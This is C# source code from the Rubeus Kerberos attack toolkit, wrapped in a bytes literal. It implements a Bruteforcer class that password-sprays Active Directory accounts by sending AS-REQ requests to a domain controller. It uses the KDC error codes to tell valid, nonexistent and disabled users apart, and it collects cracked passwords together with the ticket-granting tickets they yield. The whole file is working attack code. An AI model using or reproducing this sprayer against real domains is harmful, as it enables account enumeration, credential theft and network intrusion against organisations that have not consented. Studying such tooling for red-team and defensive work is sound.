b'\xef\xbb\xbfusing System;\nusing System.Collections.Generic;\n\nnamespace Rubeus\n{\n\n    public interface IBruteforcerReporter\n    {\n        void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE);\n        void ReportValidUser(string domain, string username);\n        void ReportInvalidUser(string domain, string username);\n        void ReportBlockedUser(string domain, string username);\n        void ReportKrbError(string domain, string username, KRB_ERROR krbError);\n    }\n\n\n    public class Bruteforcer\n    {\n\n        private string domain;\n        private string dc;\n        private IBruteforcerReporter reporter;\n        private Dictionary<string, bool> invalidUsers;\n        private Dictionary<string, bool> validUsers;\n        private Dictionary<string, string> validCredentials;\n\n        public Bruteforcer(string domain, string domainController, IBruteforcerReporter reporter)\n        {\n            this.domain = domain;\n            this.dc = domainController;\n            this.reporter = reporter;\n            this.invalidUsers = new Dictionary<string, bool>();\n            this.validUsers = new Dictionary<string, bool>();\n            this.validCredentials = new Dictionary<string, string>();\n        }\n\n        public bool Attack(string[] usernames, string[] passwords)\n        {\n            bool success = false;\n            foreach (string password in passwords)\n            {\n                foreach (string username in usernames)\n                {\n                    if(this.TestUsernamePassword(username, password))\n                    {\n                        success = true;\n                    }\n                }\n            }\n\n            return success;\n        }\n\n        private bool TestUsernamePassword(string username, string password)\n        {\n            try\n            {\n                if (!invalidUsers.ContainsKey(username) && !validCredentials.ContainsKey(username))\n                {\n                    this.GetUsernamePasswordTGT(username, password);\n                    return true;\n                }\n            }\n            catch (KerberosErrorException ex)\n            {\n                return this.HandleKerberosError(ex, username, password);\n            }\n\n            return false;\n        }\n\n        private void GetUsernamePasswordTGT(string username, string password)\n        {\n            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;\n            string salt = String.Format("{0}{1}", domain.ToUpper(), username);\n\n            // special case for computer account salts\n            if (username.EndsWith("$"))\n            {\n                salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd(\'$\').ToLower(), domain.ToLower());\n            }\n\n            string hash = Crypto.KerberosPasswordHash(encType, password, salt);\n\n            AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);\n\n            byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);\n\n            this.ReportValidPassword(username, password, TGT);\n        }\n\n        private bool HandleKerberosError(KerberosErrorException ex, string username, string password)\n        {\n            \n\n            KRB_ERROR krbError = ex.krbError;\n            bool ret = false;\n\n            switch ((Interop.KERBEROS_ERROR)krbError.error_code)\n            {\n                case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:\n                    this.ReportValidUser(username);\n                    break;\n                case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:\n                    this.ReportInvalidUser(username);\n                    break;\n                case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:\n                    this.ReportBlockedUser(username);\n                    break;\n                case Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP:\n                    this.ReportInvalidEncryptionType(username, krbError);\n                    break;\n                case Interop.KERBEROS_ERROR.KDC_ERR_KEY_EXPIRED:\n                    this.ReportValidPassword(username, password, null, (Interop.KERBEROS_ERROR)krbError.error_code);\n                    ret = true;\n                    break;\n                default:\n                    this.ReportKrbError(username, krbError);\n                    throw ex;\n            }\n            return ret;\n        }\n\n        private void ReportValidPassword(string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)\n        {\n\n            validCredentials.Add(username, password);\n            if (!validUsers.ContainsKey(username))\n            {\n                validUsers.Add(username, true);\n            }\n            this.reporter.ReportValidPassword(this.domain, username, password, ticket, err);\n        }\n\n        private void ReportValidUser(string username)\n        {\n            if (!validUsers.ContainsKey(username))\n            {\n                validUsers.Add(username, true);\n                this.reporter.ReportValidUser(this.domain, username);\n            }\n        }\n\n        private void ReportInvalidUser(string username)\n        {\n            if (!invalidUsers.ContainsKey(username))\n            {\n                invalidUsers.Add(username, true);\n                this.reporter.ReportInvalidUser(this.domain, username);\n            }\n        }\n\n        private void ReportBlockedUser(string username)\n        {\n            if (!invalidUsers.ContainsKey(username))\n            {\n                invalidUsers.Add(username, true);\n                this.reporter.ReportBlockedUser(this.domain, username);\n            }\n        }\n\n        private void ReportInvalidEncryptionType(string username, KRB_ERROR krbError)\n        {\n            if (!invalidUsers.ContainsKey(username))\n            {\n                invalidUsers.Add(username, true);\n                this.ReportKrbError(username, krbError);\n            }\n        }\n\n        private void ReportKrbError(string username, KRB_ERROR krbError)\n        {\n            this.reporter.ReportKrbError(this.domain, username, krbError);\n        }\n\n    }\n}\n'